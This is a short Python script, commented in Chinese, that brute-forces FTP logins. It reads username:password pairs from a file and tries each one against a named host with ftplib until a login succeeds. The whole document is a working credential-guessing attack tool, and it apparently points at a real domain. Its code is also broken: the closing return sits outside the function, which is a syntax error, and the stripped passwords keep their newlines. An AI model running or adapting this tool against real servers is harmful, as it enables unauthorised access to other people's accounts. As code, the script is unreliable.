import ftplib

def bruteFtpLogin(hostname,passwordFile):
    p = open(passwordFile,"r") # 以只读方式打开
    print("Now trying bruteforce attact...wait")

    for line in p.readlines(): # 在所有文本行里面去读
        lineParts = line.split(":") # 以：分割，前面是username，后面是password
        username = lineParts[0]
        password = lineParts[1]
        print("trying to use:\t" + username +"/" + password)
        try:
            ftp = ftplib.FTP(hostname) #主机不可连接状态下可能会产生异常
            ftp.login(username,password) # 正常运行去登录，同时也可能产生异常，如果错误，跳到18行except
            print("\n[*]" + str(username) + "ftp user:" +username + "password:" + password)
            ftp.quit() # 退出当前ftp
            return(username,password) # 找到后返回，不再执行
        except Exception as e:
            pass
print("\n Could not found")
return(None,None) 

if __name__ == "__main__":
    host = "imleemaimai.com"
    passwordFile = "G:\\TESTPWD.txt" # Admin:123
    bruteFtpLogin(host,passwordFile)
